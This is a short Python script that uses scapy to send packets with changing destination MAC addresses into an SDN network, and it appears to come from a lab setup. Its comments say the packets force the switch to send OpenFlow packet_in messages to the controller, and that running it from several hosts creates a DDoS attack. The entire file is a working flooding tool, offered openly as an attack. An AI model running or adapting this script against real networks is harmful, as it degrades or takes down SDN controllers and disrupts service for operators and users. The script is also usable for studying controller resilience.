#! /usr/bin/env python
# Script to send packets with different mac addresses  to the SDN network 
# It forces the switch to send an Openflow packet_in to the controller
# It can be used in several hosts to create a DDoS attack
# It must run on a host connected to a switch in the SDN network 
import scapy.all as scapy
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
import os
for i in range(100):
    oc=(i*2)
    mac1=str(oc)+':'+str(oc)+':'+str(oc)+':cc:cc:cc'
    packet =Ether(dst=mac1)/IP()/TCP()
    sendp(packet, count=1,iface='hClient-eth0')
